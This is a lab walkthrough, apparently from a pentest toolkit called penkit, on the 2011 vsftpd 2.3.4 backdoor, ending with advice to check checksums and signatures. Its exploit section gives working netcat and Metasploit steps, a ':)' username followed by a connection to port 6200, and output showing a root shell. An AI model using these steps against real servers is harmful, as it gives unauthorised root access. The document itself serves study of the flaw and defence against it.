## Vsftpd Backdoor

### Background

[Vsftpd](https://security.appspot.com/vsftpd.html) is a widely used FTP server. Despite the fact that [SFTP](https://en.wikipedia.org/wiki/SSH_File_Transfer_Protocol) has become that standard, there are still a ton of FTP servers out in the wild. Back in July of 2011, it was discovered that vsftpd 2.3.4 from the master site was patched with a backdoor.

Even though the sha256sum:

```
2a4bb16562e0d594c37b4dd3b426cb012aa8457151d4718a5abd226cef9be3a5 vsftpd-2.3.4.tar.gz
```

and check the gpg signature: 

```
$ gpg ./vsftpd-2.3.4.tar.gz.asc
gpg: Signature made Tue 15 Feb 2011 02:38:11 PM PST using DSA key ID 3C0E751C
gpg: BAD signature from "Chris Evans <chris@scary.beasts.org>"
```

are invalid, this version still spread across the internet.

How do you use this back door? Simply append a smiley face to the end of your username:)

### Setup

Start the penkit vsftpd server:

```bash
$ penkit start vsftpd:2.3.4
cc30859095aaa6780d6f87cfa43d5b2cad09d76b480d5c3b5619aa468296526d
```

Verify that server is running:

```bash
$ penkit ps
# or
$ penkit ping vsftpd
```

### Discovery

We will use `penkit nmap` to see if our target is vulnerable:

```bash
$ penkit nmap -sV penkit
Starting Nmap 6.47 ( http://nmap.org ) at 2017-03-15 12:08 EDT
Nmap scan report for penkit
Host is up (0.00029s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds
```

If the version is `vsftpd 2.3.4` then there is a chance that this particular instance of vsftpd is patched with the backdoor.


### Exploit

You can do this exploit manually:

```bash
$ penkit netcat vsftpd 21
220 (vsFTPd 2.3.4)
# Note, you will not have a bash prompt. You must type 'user anyuser:)' 
user penny:)
331 Please specify the password.
# Same here. Type 'pass anypass'
pass thepenguin
```

It hangs, so open another terminal, and:

```bash
$ penkit netcat vsftpd 6200
# Note, you will not have a bash prompt. Just start typing commands.
hostname
vsftpd

whoami
root

exit
```

Or you can use just use metasploit:

```bash
$ penkit metasploit
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(vsftpd_234_backdoor) > set RHOST vsftpd
msf exploit(vsftpd_234_backdoor) > run

[*] vsftpd:21 - Banner: 220 (vsFTPd 2.3.4)
[*] vsftpd:21 - USER: 331 Please specify the password.
[+] vsftpd:21 - Backdoor service has been spawned, handling...
[+] vsftpd:21 - UID: uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
[*] Found shell.
[*] Command shell session 1 opened (172.23.0.3:51443 -> 172.23.0.2:6200) at 2017-03-15 16:04:57 +0000

# Note, you will not have a bash prompt. Just start typing commands.
whoami
root
```

### Summary

This is a pretty silly backdoor but it goes to show you that unless you are vigilant about verifying that you have genuine software, you are dramatically increasing your risk. While the person who developed this backdoor was probably trolling, this sort of attack could obviously be much sneakier.

You can mitigate this risk by:

- Always checking your checksums
- Always verifying your signatures

More information can be found here:

- https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
- https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor
